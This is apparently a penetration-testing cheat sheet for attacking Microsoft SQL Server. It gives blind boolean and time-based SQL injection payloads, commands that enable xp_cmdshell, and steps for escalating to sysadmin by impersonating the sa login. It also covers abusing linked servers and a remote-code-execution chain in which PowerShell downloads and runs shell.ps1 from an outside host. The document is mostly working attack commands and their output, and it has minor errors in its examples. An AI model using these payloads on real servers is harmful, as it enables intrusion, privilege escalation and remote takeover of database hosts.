This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:
    MSSQL clients not using encryption to connect to the MSSQL server
    The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    The use of named pipes
    Weak & default sa credentials. Admins may forget to disable this account

## Connect to MSSQL server
#### Using Impacket mssqlclient.py
`mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>`
`## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine`
`mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>C

-------------------------------------------------------------------------------------------------------------------------------------------
#### List all databases
`SELECT name FROM master.dbo.sysdatabases`

-------------------------------------------------------------------------------------------------------------------------------------------
#### List all Tables
`SELECT TABLE_NAME FROM [<DATABASE_NAME>].INFORMATION_SCHEMA.TABLES` 

-------------------------------------------------------------------------------------------------------------------------------------------
#### Read Local Files(Example)
`SELECT * FROM OPENROWSET (BULK 'file_path', SINGLE_CLOB) as correlation_name`

-------------------------------------------------------------------------------------------------------------------------------------------
#### How to filter for string start by something(ex N*)
`select * from users where firstName like '%N'`

-------------------------------------------------------------------------------------------------------------------------------------------
#### Limit rows (Ex first 5)
`select top 5 * from users`

-------------------------------------------------------------------------------------------------------------------------------------------
#### Select where stringlen > something
`select * from users where len(firstName) > 10`

-------------------------------------------------------------------------------------------------------------------------------------------
#### LIMIT/OFFSET
`select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only", table_name_length`
(The offset is the index basically from which row where to start, and the second part will tell how many rows to export from the given offset index)

-------------------------------------------------------------------------------------------------------------------------------------------
#### Joining tables
(join posts+users tables over userid and authorID to make a match)
`select users.id,users.email,users.password,posts.authorId,posts.title from users join posts on users.id=posts.authorID where <Extra_CONDITION_HERE>`

-------------------------------------------------------------------------------------------------------------------------------------------
#### Blind Boolean
`somethingvalid' AND 1=1-- -`
(True if both are true)

-------------------------------------------------------------------------------------------------------------------------------------------
#### Blind TimeBased
`somethingvalid';WAITFOR DELAY '0:0:5'--'`
(Test if possible...)

`somethingvalid';IF (condition) WAITFOR DELAY '0:0:5'--'`
(take it further by example exfiltrating part of DB, sleep 5sec if condition true)

-------------------------------------------------------------------------------------------------------------------------------------------
#### How to enable XP_CMDSHELL
`EXEC SP_CONFIGURE 'show advanced options',1;reconfigure;EXEC SP_CONFIGURE 'xp_cmdshell',1;reconfigure;`

-------------------------------------------------------------------------------------------------------------------------------------------
## How to Impersonate(via SQLCMD.exe)
1)Check which users can we Impersonate
```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Example:

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

name
sa
ben
valentin
(3 rows affected)
```


2)Check our users permissions 
```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Example:
```
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
-----------
julio                                                                                                                    
(1 rows affected)
-----------
          0
(1 rows affected)
```

3)Impersonation time(use one of the users from step 1)
```
EXECUTE AS LOGIN = 'USERNAME'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Example:
```
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
-----------
sa
(1 rows affected)
----------
          1
(1 rows affected)
```


-------------------------------------------------------------------------------------------------------------------------------------------
## How to check for Linked  databases(is Remoted=0 aka Linked)
`SELECT srvname, isremote FROM sysservers`
`GO`
Example:
```
1> SELECT srvname, isremote FROM sysservers
2> GO
srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
(2 rows affected)

```

## Run command on remote server(this will run the command as Sysadmin on the linked server )
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<LINKED_DB>]
Example:EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                
(1 rows affected)
```

Extra example on how to get a RCE:
```
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
EXECUTE('EXEC xp_cmdshell ''powershell -NoP -NonI -c Invoke-WebRequest -Uri http://10.9.20.13:8080/shell.ps1 -Outfile C:\Users\Public\shell.ps1''') AT [m3sqlw.m3c.local]
EXECUTE('EXEC xp_cmdshell ''powershell -c
Start-Process -NoNewWindow -FilePath c:\Users\Public\shell.ps1''') AT [m3sqlw.m3c.local]
```
